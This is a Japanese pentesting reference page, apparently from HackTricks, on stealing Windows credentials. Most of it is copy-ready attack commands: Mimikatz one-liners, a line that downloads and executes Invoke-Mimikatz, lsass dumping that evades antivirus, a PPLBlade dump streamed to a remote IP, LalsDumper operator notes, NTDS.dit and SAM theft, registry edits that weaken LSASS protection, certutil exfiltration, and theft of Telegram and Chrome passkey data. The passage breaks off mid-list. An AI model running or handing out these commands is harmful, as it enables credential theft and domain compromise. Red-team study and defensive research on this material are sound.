# Windows認証情報の窃取

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatzでできるその他のことは** [**こちらのページ**](credentials-mimikatz.md)**で確認してください。**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**考えられる認証情報の保護対策についてはこちらをご覧ください。**](credentials-protections.md) **この保護対策により、Mimikatzによる認証情報の抽出を防げる場合があります。**

## Credentials with Meterpreter

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)を使って、被害者のシステム内にある**パスワードやハッシュを検索**します。

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Bypassing AV

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)の**Procdump は正規の Microsoft ツールであるため**、Defender に検出されません。\
このツールを使って **lsass プロセスを dump し**、**dump をダウンロードして**、dump から **認証情報をローカルで抽出**できます。

[SharpDump](https://github.com/GhostPack/SharpDump)を使うこともできます。

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) で自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の**AV**は、**procdump.exeを使用してlsass.exeをダンプする**行為を**悪意のあるものとして検知**する場合があります。これは、文字列 **"procdump.exe" と "lsass.exe"** を**検知**しているためです。そのため、**lsass.exeの名前の代わりに**、lsass.exeの**PID**を**引数**としてprocdumpに**渡す**ほうが、より**ステルス性が高く**なります。

### **comsvcs.dll**を使用したlsassのダンプ

`C:\Windows\System32`にある**comsvcs.dll**という名前のDLLは、クラッシュ時に**プロセスメモリをダンプする**役割を担います。このDLLには**`MiniDumpW`**という名前の**関数**が含まれており、`rundll32.exe`を使って呼び出すように設計されています。\
最初の2つの引数は何を指定してもかまいませんが、3つ目の引数は3つの要素に分かれています。1つ目はダンプ対象のプロセスID、2つ目はダンプファイルの保存先、3つ目は必ず**full**という単語です。ほかの選択肢はありません。\
これら3つの要素が解析されると、DLLはダンプファイルを作成し、指定されたプロセスのメモリをそのファイルに転送します。\
**comsvcs.dll**を使用してlsassプロセスをダンプできるため、procdumpをアップロードして実行する必要はありません。この方法の詳細は[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)で説明されています。<sup>[[9]](#references)</sup>

実行には次のコマンドを使用します:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Manager を使った lsass のダンプ**

1. Task Bar を右クリックし、Task Manager をクリックします
2. More details をクリックします
3. Processes タブで「Local Security Authority Process」プロセスを探します
4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックします

### procdump を使った lsass のダンプ

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部である、Microsoft 署名済みのバイナリです。

既存のシステム全体のクラッシュダンプや、アクセス可能なユーザーフォルダ内にある圧縮コピーには、オフライン分析用の認証情報が残っている場合があります。`MEMORY.DMP` や `MEMORY.7z` のようなファイル名は調査の手がかりにすぎません。出所とアクセス権を確認し、利用可能または最新の認証情報が含まれていると決めつけないでください。

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## VM スナップショットからのオフライン認証情報抽出

読み取り可能な VM バックアップには、実行中の guest や LSASS にアクセスできなくても、保存された **guest memory image** が含まれている場合があります。VMware では、`.vmsn` スナップショットメタデータと、存在する場合は対応する `.vmem` を特定します。どちらも `.vmdk` ディスクイメージと混同しないでください。`VMkatz` はスナップショットまたは VM ディレクトリを入力として解析し、guest memory から[Windows のログオンセッションの認証情報](credentials-mimikatz.md)（ハッシュやチケットなど）を復元できます。また、仮想ディスクを調べて SAM/LSA の情報を取得することもできます。前提となるのはバックアップファイルへのアクセスであり、稼働中の VM に対するデバッグ権限ではありません。<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Checkpoint の例では、スタンドアロン VM のスナップショットから**ローカル** Administrator の NT hash を復元しました。別途パスワードの再利用が確認された後にのみドメインへの認証に成功しており、バックアップから取得したローカル hash がそのままドメインの認証情報になるわけではありません。メモリに制約のあるホストでは、VMkatz はページを段階的にスキャンして解放できますが、スナップショットをより大容量の解析ホストにコピーする方が適切な場合もあります。<sup>[[17]](#references)[[18]](#references)</sup>

## PPLBlade による lsass のダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションへ転送できる Protected Process Dumper Tool です。

**主な機能**:

1. PPL 保護のバイパス
2. Defender のシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
3. ディスクに保存せずに、RAW および SMB のアップロード方式でメモリダンプをアップロード（fileless dump）

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump を使わない SSP ベースの LSASS ダンプ

Ink Dragon は、`MiniDumpWriteDump` を一切呼び出さない 3 段階の dumper **LalsDumper** を使用します。そのため、この API に対する EDR の hook は発動しません:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` 内で小文字の `d` 32 個からなる placeholder を検索し、`rtu.txt` の絶対パスで上書きします。パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより、**LSASS** は悪意のある DLL を新しい Security Support Provider (SSP) として読み込みます。
2. **LSASS 内の Stage 2** – LSASS が `nfdp.dll` を読み込むと、この DLL は `rtu.txt` を読み込み、各 byte を `0x20` で XOR し、デコードした blob をメモリに map してから実行を引き渡します。
3. **Stage 3 dumper** – map された payload は、hash 化された API 名から解決した **direct syscall** を使って MiniDump の logic を再実装します (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`)。専用の export `Tom` は `%TEMP%\<pid>.ddt` を開き、圧縮した LSASS dump をファイルに書き込んで handle を閉じます。これにより、後から exfiltration できます。

Operator 向けの注意事項:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt` は同じ directory に置いてください。Stage 1 は hard-coded placeholder を `rtu.txt` の絶対パスで書き換えるため、別々の場所に置くと chain が切れます。
* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加して行います。この値を自分で設定すれば、起動のたびに LSASS が SSP を再読み込みするようにできます。
* `%TEMP%\*.ddt` ファイルは圧縮された dump です。ローカルで解凍してから、credential extraction に Mimikatz/Volatility を使用します。
* `AddSecurityPackageA` を成功させるには、`lals.exe` の実行に admin/SeTcb 権限が必要です。呼び出しが戻ると、LSASS は rogue SSP を透過的に読み込み、Stage 2 を実行します。
* DLL をディスクから削除しても、LSASS からは削除されません。registry entry を削除して LSASS を再起動する (reboot) か、長期 persistence のためにそのまま残してください。

## CrackMapExec

### SAM hash の dump

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA secretsのダンプ

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### ターゲット DC から NTDS.dit をダンプする

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### ターゲット DC から NTDS.dit のパスワード履歴をダンプする

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM_ に**あります**。ただし、保護されているため、**通常の方法ではコピーできません**。

### Registry から

これらのファイルを窃取する最も簡単な方法は、Registry からコピーを取得することです。

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**それらのファイルを**Kaliマシンに**ダウンロードし、次の方法でハッシュを抽出します**:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

このサービスを使用して、保護されたファイルをコピーできます。Administrator 権限が必要です。

読み取り可能なネットワーク共有上ですでに公開されているスナップショットを使用する別のワークフローについては、[SMB Previous Versions](../../network-services-pentesting/pentesting-smb/#read-previous-versions-exposed-by-a-share) を参照してください。

#### vssadmin を使用する

vssadmin バイナリは Windows Server バージョンでのみ利用できます。

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

ただし、**Powershell**からも同じことができます。以下は、**SAM file**をコピーする方法の例です（使用するドライブは「C:」で、C:\users\Publicに保存されます）。保護されたファイルなら何でも、この方法でコピーできます。

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

書籍のコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使って、SAM、SYSTEM、ntds.ditのコピーを作成することもできます。

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory の認証情報 - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の中核として知られ、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hash** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースで、**_%SystemRoom%/NTDS/ntds.dit_** にあります。

このデータベースには、主に次の3つのテーブルがあります。

- **Data Table**: ユーザーやグループなどのオブジェクトの詳細を保存します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **security descriptor** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を担います。

Christoffer Andersson によるデータベース層の調査では、これらのテーブルとバージョンごとの動作について、さらに詳しく解説されています。<sup>[[8]](#references)</sup>

Windows は _Ntdsa.dll_ を使用してこのファイルとやり取りし、_lsass.exe_ がこれを使用します。そのため、**NTDS.dit** ファイルの**一部**が **`lsass` のメモリ内**に存在する場合があります（パフォーマンス向上のために**キャッシュ**が使われているので、直近にアクセスされたデータを見つけられる可能性があります）。

#### NTDS.dit 内の hash を復号する

hash は3回復号されます。

1. **BOOTKEY** と **RC4** を使用して Password Encryption Key (**PEK**) を復号する。
2. **PEK** と **RC4** を使用して **hash** を復号する。
3. **DES** を使用して **hash** を復号する。

**PEK** はすべてのドメインコントローラーで**同じ値**ですが、そのドメインコントローラーの **SYSTEM** hive にある、ドメインコントローラー固有の **BOOTKEY** で **NTDS.dit** 内に**暗号化されて**います。そのため、認証情報を抽出するには **NTDS.dit** と **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) の両方が必要です。

別の [kernel handle-table redirection technique](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) を使うと、VSS を使わずに、すでに開かれている NTDS file object をコピーできます。ただし、ドメインコントローラー上で任意の kernel read/write primitive が必要です。<sup>[[16]](#references)</sup>

### Ntdsutil を使用した NTDS.dit のコピー

Windows Server 2008 以降で利用できます。

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

[**volume shadow copy**](#stealing-sam-and-system) の手法を使って **ntds.dit** ファイルをコピーすることもできます。また、**SYSTEM ファイル**のコピーも必要です（同じく、[**レジストリから dump するか、volume shadow copy を使う**](#stealing-sam-and-system)手法を利用してください）。

### **NTDS.dit からハッシュを抽出する**

**NTDS.dit** ファイルと **SYSTEM** ファイルを**取得したら**、_secretsdump.py_ などのツールを使って**ハッシュを抽出**できます。

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

有効なドメイン管理者ユーザーを使用して、自動的に**抽出する**こともできます：

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**大きな NTDS.dit ファイル**は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使って抽出することをおすすめします。

最後に、**metasploit module**の _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** の `lsadump::lsa /inject` も使用できます。

### **NTDS.dit からドメインオブジェクトを SQLite データベースに抽出する**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使うと、NTDS オブジェクトを SQLite データベースに抽出できます。秘密情報だけでなく、オブジェクト全体とその属性も抽出できるため、NTDS.dit の生ファイルをすでに取得している場合は、さらに情報を抽出できます。

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive は必須ではありませんが、シークレットの復号を可能にします（NT および LM ハッシュ、平文パスワードなどの補足資格情報、Kerberos キーや信頼キー、NT および LM パスワード履歴）。その他の情報とともに、次のデータが抽出されます：ユーザーおよびマシンアカウントとそのハッシュ、UAC フラグ、最終ログオンとパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的なメンバーシップ、組織単位のツリーとメンバーシップ、信頼の種類、方向、属性を含む信頼済みドメインなど。

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードしてください。このバイナリを使用して、さまざまなソフトウェアから資格情報を抽出できます。

```
lazagne.exe all
```

## SAM と LSASS から認証情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールを使うと、メモリから認証情報を抽出できます。こちらからダウンロードしてください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから認証情報を抽出します

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM ファイルから認証情報を抽出する

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

ここからダウンロードします:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)。**実行する**だけで、パスワードが抽出されます。

## アイドル状態のRDPセッションの調査とセキュリティ制御の弱体化

Ink DragonのFinalDraft RATには、あらゆるred-teamerに役立つ手法を備えた`DumpRDPHistory` taskerが含まれています:<sup>[[3]](#references)</sup>

### DumpRDPHistory形式のテレメトリ収集

* **送信先のRDPターゲット** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`にある各ユーザーハイブを解析します。各サブキーには、サーバー名、`UsernameHint`、最終書き込みタイムスタンプが保存されています。PowerShellでFinalDraftのロジックを再現できます:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **受信RDPの証跡** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログを検索し、イベントID **21**（ログオン成功）と **25**（切断）から、誰がそのマシンを管理していたかを把握します。

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

接続する Domain Admin が分かったら、その **切断済み** セッションがまだ残っている間に、LalsDumper/Mimikatz で LSASS をダンプします。CredSSP と NTLM fallback により、認証情報の検証子とトークンが LSASS に残るため、それらを SMB/WinRM 経由でリプレイし、`NTDS.dit` を取得したり、ドメインコントローラーに永続化を仕掛けたりできます。

### FinalDraft が標的とするレジストリのダウングレード

同じ implant は、認証情報の窃取を容易にするため、複数のレジストリキーにも改変を加えます:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` は受信 RDP の Restricted Admin を無効にします。このモードで pass-the-hash を有効にするものではありません。値を `0` にすると接続先で Restricted Admin が許可されますが、クライアントが `/RestrictedAdmin` を要求するか、Restricted Admin を必須とするポリシーを使用する必要があります。<sup>[[14]](#references)</sup> ハッシュだけではリモート管理者権限は付与されません。[RDP authentication prerequisites](../../network-services-pentesting/pentesting-rdp.md) を参照してください。<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` は UAC のトークンフィルタリングを無効にし、ローカル管理者がネットワーク経由で制限のないトークンを取得できるようにします。
* `DSRMAdminLogonBehavior=2` は、DC がオンラインのときに DSRM 管理者がログオンできるようにし、攻撃者にもう1つの組み込み高権限アカウントを与えます。
* `RunAsPPL=0` は LSASS PPL の保護を解除し、LalsDumper などのダンプツールによるメモリへのアクセスを容易にします。

## hMailServer configuration credentials (侵害後)

インストール構成に応じて、`C:\Program Files\hMailServer\Bin\hMailServer.ini`、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`、`C:\ProgramData\hMailServer\hMailServer.ini` の正確な構成ファイルを確認してください。読み取り可能で空ではない `[Security] AdministratorPassword=` の値は hMailServer 管理者パスワードのハッシュであり、Windows Administrator のパスワードを示すものではありません。この認証情報を回収できた場合でも、Windows アカウントへのピボットには、パスワードの再利用とログオン権限をそれぞれ独立して確認する必要があります。

SQL CE データベースを使用するインストールでは、INI 内の別の `[Database] Password=` の値がデータベースを保護します。レガシーインストールでは、この値は静的キー `THIS_KEY_IS_NOT_SECRET` と4バイト単位のワードのエンディアン入れ替えを用いて Blowfish で暗号化されています。INI 内の16進文字列を使って、次の Python スニペットを実行してください。<sup>[[2]](#references)</sup>

まず、現在のアカウントで INI と対応する SQL CE `.sdf` データベースの**両方**を読み取れることを確認してください。INI のパスワードはデータベースを保護するものであり、データベース内に保存されたメールボックスアカウントのハッシュとは別のものです。使用中のデータベースを調査またはアップグレードする場合は、稼働中のファイルではなく**コピー**を使用してください。

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

平文パスワードを使って、ファイルロックを避けるために SQL CE データベースをコピーし、32-bit provider を読み込み、必要に応じてアップグレードしてからハッシュを照会します。

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` 列は hMailServer のハッシュ形式（hashcat mode `1421`）を使用します。解読したメールボックスのパスワードを Windows アカウントへの pivot に利用できるのは、そのパスワードがローカル/ドメインアカウントでも再利用されており、そのアカウントに必要なリモートログオン権限がある場合に限られます。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部のツールは、LSA のログオンコールバック `LsaApLogonUserEx2` を傍受して**平文のログオンパスワード**を取得します。認証パッケージのコールバックをフックまたはラップし、認証情報を**ログオン中**（ハッシュ化前）に取得してから、ディスクに書き込むかオペレーターに返す仕組みです。一般的には、LSA にインジェクトするか LSA に登録するヘルパーとして実装され、成功した対話型/ネットワークログオンイベントごとにユーザー名、ドメイン、パスワードを記録します。<sup>[[1]](#references)</sup>

運用上の注意:
- ヘルパーを認証パスに読み込むには、ローカル管理者/SYSTEM 権限が必要です。
- 認証情報が取得されるのはログオンが発生した場合のみです（フックによって、対話型、RDP、サービス、またはネットワークログオンが対象になります）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、保存された接続情報をユーザーごとの `sqlstudio.bin` ファイルに格納します。専用の dumper でファイルを解析し、保存された SQL 認証情報を復元できます。コマンド出力しか返せないシェルでは、ファイルを Base64 でエンコードして stdout に出力し、外部へ持ち出すことがよくあります。<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

オペレーター側でファイルを再構築し、dumperをローカルで実行して認証情報を復元します。

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol を介したブラウザーセッションと cookie の窃取

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop の `tdata` セッション窃取

Telegram Desktop は、認証情報とアカウント状態を **`tdata`** ディレクトリに保存します。コピーしたセッションは、認証が有効な間、対応するツールで読み込むことで、アカウントのパスワードなしに認証できます。ローカルデータの暗号化が有効な場合、stealer はパスコードも必要とします。認証済みセッションからは、本人確認情報、ダイアログやメンバーシップのメタデータ、メッセージ、ダウンロード可能なメディアを取得できます。<sup>[[10]](#references)</sup>

### 発見と取得

インストール版とポータブル版の両方の配置を検索します。Microsoft Store のパッケージ名は異なる場合があるため、`TelegramMessenge` を含むパッケージディレクトリを列挙し、その `LocalCache\Roaming` サブツリーを調べます。<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

通常の読み取りに失敗し、プロセストークンに `SeBackupPrivilege` が**すでに含まれ、有効になっている**場合は、バックアップ対応アクセスが代替手段になります。これは特権を取得したり、プロセスを昇格させたりするものではありません。`CreateFileW` に `FILE_FLAG_BACKUP_SEMANTICS` を指定すると、必要なトークン特権がある場合にバックアップ／復元セマンティクスを要求し、ファイルのセキュリティチェックを回避できます。ただし、このフラグだけでは、互換性のない共有ロックを回避できません。<sup>[[10]](#references)[[11]](#references)</sup>

使用中でロックされたファイルには **Volume Shadow Copy** を作成して読み取ります。ACLによってアクセスが拒否されるファイルには、`robocopy /B` を使うとバックアップモードでファイルとディレクトリのACLを回避できます。<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

帯域幅を意識したimplantは、まずファイルパスの一覧だけを送信し、snapshot identifierと、C2にすでに保存されているパスを受け取り、不足しているファイルだけをアップロードすることがあります。そのため、再帰的な`tdata`の列挙後に行われる小規模な差分転送も、セッション窃取の成功を示している可能性があります。<sup>[[10]](#references)</sup>

### 検知と封じ込め

Telegram以外のプロセスによる`tdata`への再帰的アクセスを、`SeBackupPrivilege`の有効化、backup semanticsを使ったファイルオープン、VSSのアクティビティ、または`/B`を使用する子プロセス`robocopy.exe`と関連付けて調査します。また、`%APPDATA%`と`%LOCALAPPDATA%\Packages`の両方を短時間で列挙し、その後に同じプロセスから外部接続が行われていないかも調査します。侵害後は、**Settings → Devices**（または**Privacy & Security → Active Sessions**）を使用して、見覚えのないセッションを終了します。2段階認証を有効にしても、すでに盗まれた認証は無効になりません。<sup>[[10]](#references)[[13]](#references)</sup>

## Windows上のChromeからのPasskeys / WebAuthn認証情報の窃取

**Google Password Managerで同期されたpasskeysを使用するChrome**が動作するWindowsホストで、**victim user**としてコード実行権を取得できた場合、**admin/SYSTEM権限がなくても**passkeysは興味深いpost-exploitationの標的になります。<sup>[[4]](#references)</sup>

### 興味深いローカルアーティファクト

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`**には、protobufでエンコードされた**`WebauthnCredentialSpecifics`**レコードが保存されます。同じユーザー権限で動作するプロセスは、同期されたパスキーの**RP ID**、**ユーザー名**、**credential ID**、暗号化された秘密鍵のデータを列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**には、**`wrapped_identity_private_key`**や、同期された認証情報の復元に使われるラップ済みシークレットなど、ローカルのデバイス登録状態が保存されます。<sup>[[4]](#references)</sup>

簡易トリアージ:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blobsは、ローカルの署名オラクルとして悪用される可能性がある

ブラウザーがTPM-backed identity keyを**`NCRYPT_OPAQUE_KEY_BLOB`**としてエクスポートし、そのblobをユーザーがアクセス可能な状態に保存している場合、マルウェアはraw private keyを抽出する必要はありません。同じマシン上でblobを再インポートし、攻撃者が制御するデータへの署名をローカルTPMに要求するだけです:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

これは、**hardware bindingによってデバイス外へのエクスポートは防げるものの、侵害されたエンドポイント上で同じユーザーとして使用することは防げない**ことを意味します。

### 現実的な悪用経路

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - ChromeのLevelDBから`WebauthnCredentialSpecifics`を列挙する。
   - passkey loginを開始し、新しいWebAuthn challengeを取得する。
